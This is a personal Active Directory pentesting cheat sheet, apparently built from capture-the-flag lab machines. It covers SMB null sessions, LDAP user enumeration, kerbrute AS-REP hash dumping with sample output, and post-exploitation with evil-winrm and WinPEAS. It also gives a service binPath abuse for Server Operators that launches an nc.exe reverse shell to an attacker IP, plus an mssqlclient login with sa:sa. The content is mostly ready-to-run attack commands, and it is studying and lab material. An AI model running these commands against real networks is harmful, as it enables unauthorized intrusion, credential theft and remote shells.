# Active Directory CheatSheet

### What I want to learn from this path.

    - Understand how kerberos and Kerbrute works!



### SMB service
-   using smbmap we can get the shares
    
    ```bash
    smbmap -H <host> -u 'null'
    # to perform the null session 
    ```


-   using smbclient

    ```bash
    smbclient -L //<host>/Shares -N
    # with -N we perform a null session

    smbclient //<host>/Shares -N
    # to connect without listing the shares
    ```
    

### LAPS
Local Administrator Password Solution. Is used to manage local account
passwords of Active Directory computers.




### LDAP (Lightweight directory access protocol)
Is a protocol that makes it possible for applications to query
user information rapidly.


the port fort ldap 389


Someone within your office wants to do two things: Send email to a
recent hire and print a copy of that conversation on a new printer.
LDAP (lightweight directory access protocol) makes both of those steps possible.

Set it up properly, and that employee doesn't need to talk with IT
to complete the tasks.


### What is LDAP?

Companies store usernames, passwords, email addresses, printers
connections, and other static data within directories. LDAP is an
open, vendor-natural application protocol for accessing and main-
taining that data. LDAP can also trackle authentication, so users can sign
on just once and access many different files on the server.

```bash
# user enumeration for ldap protocol 389

/opt/windapsearch.py -d <domain> --dc-ip <ip address>


GetADUsers.py -d <domain>/ -dc-ip <ip address> -debug
```


### Kerberos


With a several names, we get using user-anarchy, possible
usernames

and perform a kerbrute attack

```bash
kerbrute userenum -d <domain> --dc <ip address> user-list.txt
```

with this tool if there are any valid user in the user-list.txt
we get a hash referring to a Ticket Granted Ticket

```bash
❯ /opt/kerbrute  userenum -d <domain name "commonly .local or .htb"> --dc <ip address domain controller> unames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop

2023/05/29 23:33:40 >  Using KDC(s):
2023/05/29 23:33:40 >   10.10.10.175:88

2023/05/29 23:33:40 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$<userdomain>@<domain>:<hash to crack it with john or hashcat>
2023/05/29 23:33:40 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/05/29 23:33:41 >  Done! Tested 24 usernames (1 valid) in 0.481 seconds
```

The code above it's an example of how can i do to get the TGT from kerbrute and
after that I cracked it and i get the password for the user fsmith and
connect it with evil-winrm


Inside the Powershell console, I started enumerating information

```powershell
net user <user>

# to get the ptivilege information about that user
whoami /priv

# to find any other resurce inside the Powershell I use

Get-ChildItem -Path "C:\Users\<User>" -Filter "name of file" -Recurse
```

## Further information

Using Winpeas.exe and updload it from the attack machine by evil-winrm
and get the information using evil-winrm

### Getting information using the Winpeas.exe

## Bloodhound

...


## Services in Active Directory

when you have the privilege **Server Operators**
You can perform a change the execution of a service
for example:

```powershell
sc.exe create reverse binPath="C:\<destination path from the exe>"
# in this case the solution could be
sc.exe <services name> config binPath=""
sc.exe stop <service name>
sc.exe start <service name>
```


final code
```powershell
sc.exe create reverse binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.39 443"
```



## Impacket-Tools

```bash
mssqlclient.py scrm.local/sa:sa@10.10.11.168
```
